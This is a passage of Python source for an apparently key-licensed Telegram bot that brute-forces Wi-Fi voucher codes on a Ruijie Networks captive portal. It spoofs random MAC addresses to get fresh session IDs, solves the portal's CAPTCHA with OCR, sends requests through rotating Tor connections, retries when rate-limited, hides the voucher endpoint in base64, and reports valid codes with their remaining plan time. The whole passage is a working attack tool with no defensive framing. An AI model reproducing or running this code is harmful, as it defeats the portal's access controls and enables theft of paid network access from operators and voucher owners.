        found = len(success_texts.get(chat_id, []))
        retries = retry_counts.get(chat_id, 0)
        if chat_id in scan_tasks:
            scan_tasks[chat_id]["checked"] = checked
            scan_tasks[chat_id]["speed"] = speed
            scan_tasks[chat_id]["found"] = found
            scan_tasks[chat_id]["retries"] = retries
        text = format_progress(checked, total, speed, found, retries)
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=progress_msg.message_id,
                text=text
            )
        except Exception:
            try:
                new_msg = await bot.send_message(chat_id, text)
                progress_msg.message_id = new_msg.message_id
            except Exception as err:
                print(f"Progress Message Error: {err}")

    try:
        for code in code_iter:
            # Stop / cancelled check
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                break
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                break

            # Key expiration check every 600 s
            if time.monotonic() - last_key_check >= 600:
                auth_list, _ = await get_file_content("auth_list.json")
                if (
                    str(chat_id) not in auth_list
                    or not check_key_expiration(auth_list[str(chat_id)])
                ):
                    approve[chat_id] = False
                    await bot.send_message(
                        chat_id,
                        "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။"
                    )
                    scan_tasks.pop(chat_id, None)
                    success_messages.pop(chat_id, None)
                    success_texts.pop(chat_id, None)
                    break
                last_key_check = time.monotonic()

            # Launch task; discard from pending set on completion
            t = asyncio.create_task(_check(code))
            pending.add(t)
            t.add_done_callback(pending.discard)

            # When at capacity: wait for at least one to finish before adding more
            if len(pending) >= effective_concurrency:
                done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
                checked += len(done)
                await _flush_progress()

        # Drain remaining in-flight tasks
        while pending:
            done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
            checked += len(done)

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            final_retries = retry_counts.get(chat_id, 0)
            finish_text = (
                "🔍Scanning Completed\n\n"
                f"📦Checked : {checked:,}\n"
                f"✅Found : {final_found}\n"
                f"🔁Retry : {final_retries}\n"
                "📊Progress : 100%\n"
                "[████████████████████]"
            )
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=finish_text
                )
            except:
                try:
                    await bot.send_message(chat_id, finish_text)
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)


def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            print(f"[get_session_id] status={req.status} final_url={response}")
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                print(f"[get_session_id] found sessionId={session_id.group(1)}")
                return session_id.group(1)
            else:
                print(f"[get_session_id] no sessionId in URL, returning previous={previous_session_id}")
                return previous_session_id
    except Exception as e:
        print(f"[get_session_id] ERROR url={session_url[:80]} exception={type(e).__name__}: {e}")
        return previous_session_id

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

SESSION_POOL_LIMIT = 60
SESSION_POOL_SLOTS = 10

async def get_pooled_session_id(chat_id, task_session, session_url):
    if chat_id not in _session_pool:
        _session_pool[chat_id] = {
            "slots": [{"session_id": None, "uses": 0, "lock": asyncio.Lock()} for _ in range(SESSION_POOL_SLOTS)],
            "rr": 0
        }
    pool = _session_pool[chat_id]

    # Round-robin: find any slot with remaining capacity
    for i in range(SESSION_POOL_SLOTS):
        idx = (pool["rr"] + i) % SESSION_POOL_SLOTS
        entry = pool["slots"][idx]
        if entry["session_id"] and entry["uses"] < SESSION_POOL_LIMIT:
            pool["rr"] = (idx + 1) % SESSION_POOL_SLOTS
            entry["uses"] += 1
            return entry["session_id"]

    # All slots exhausted — refresh the next slot (non-blocking for others)
    idx = pool["rr"] % SESSION_POOL_SLOTS
    pool["rr"] = (pool["rr"] + 1) % SESSION_POOL_SLOTS
    entry = pool["slots"][idx]
    async with entry["lock"]:
        if entry["session_id"] and entry["uses"] < SESSION_POOL_LIMIT:
            entry["uses"] += 1
            return entry["session_id"]
        new_sid = await get_session_id(task_session, session_url, entry["session_id"])
        if new_sid:
            entry["session_id"] = new_sid
            entry["uses"] = 1
            print(f"[session-pool] chat={chat_id} slot={idx} new sessionId={new_sid}")
        return entry["session_id"]

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=60 if proxy_enabled else 30)
        conn = _next_tor_connector()

        async with aiohttp.ClientSession(
            connector=conn,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:

            session_id = await get_pooled_session_id(chat_id, task_session, session_url)
            if not session_id:
                return

            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")
            if not auth_code:
                return

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": (
                    f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                ),
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
            except Exception as e:
                print(f"[perform_check] error: {e}")
                return

        if response and 'request limited' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        code_line = "\n\n".join(success_texts[chat_id])
        await SUCCESS_CODE.put({
            "chat_id": chat_id,
            "code": code
        })
        if message:
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(
                        chat_id=message.chat.id,
                        text=f"Success Codes:\n\n{code_line}"
                    )
                    success_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=success_messages[chat_id],
                            text=f"Success Codes:\n\n{code_line}"
                        )
                    except Exception as e:
                        try:
                            sent = await bot.send_message(
                                chat_id=message.chat.id,
                                text=f"Success Codes:\n\n{code_line}"
                            )
                            success_messages[chat_id] = sent.message_id
                        except Exception as err:
                            print(f"Success Fallback Error: {err}")
            except Exception as e:
                print(f"Success Message Error: {e}")
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
        limited_line = "\n\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(
                        chat_id=message.chat.id,
                        text=f"Limited Codes:\n\n{limited_line}"
                    )
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=limited_messages[chat_id],
                            text=f"Limited Codes:\n\n{limited_line}"
                        )
                    except Exception as e:
                        try:
                            sent = await bot.send_message(
                                chat_id=message.chat.id,
                                text=f"Limited Codes:\n\n{limited_line}"
                            )
                            limited_messages[chat_id] = sent.message_id
                        except Exception as err:
                            print(f"Limited Fallback Error: {err}")
            except Exception as e:
                print(f"Limited Message Error: {e}")

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    hours = int(total_minutes) // 60
    minutes = int(total_minutes) % 60
    if hours > 0 and minutes > 0:
        return f"{hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h"
    else:
        return f"{minutes}m"

async def Code_Expires_Date(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId=04ecdc104a99406194f594057b21fd21&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            connector_owner=True,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as fresh_session:
            async with fresh_session.get(
                f"http://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
                headers=headers
            ) as req:
                respond = await req.json()
                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
    except Exception as e:
        print(f"[Code_Expires_Date] error: {e}")
        return "📋 Plan: Unknown | ⏳ Time: Unknown"


_ocr = ddddocr.DdddOcr(show_ad=False)
_ocr_executor = concurrent.futures.ThreadPoolExecutor(max_workers=200)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(_ocr_executor, _ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
        if data.get("success") == True:
            return session_id
        else:
            return None


async def start_polling():
    backoff = 5
    while True:
        try:
            print("[polling] Starting infinity_polling...")
            await bot.infinity_polling(timeout=20, request_timeout=35)
            print("[polling] infinity_polling exited cleanly, restarting...")
            await asyncio.sleep(2)
            backoff = 5
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"[polling] Connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"[polling] Unexpected error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    await rebuild_session(use_proxy=False)
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await start_polling()
    finally:
        if session and not session.closed:
            await session.close()
        if _connector and not _connector.closed:
            await _connector.close()
        for c in _tor_connectors:
            if not c.closed:
                await c.close()
        for p in _tor_processes:
            try:
                if p.returncode is None:
                    p.terminate()
            except Exception:
                pass

if __name__ == '__main__':
    asyncio.run(main())
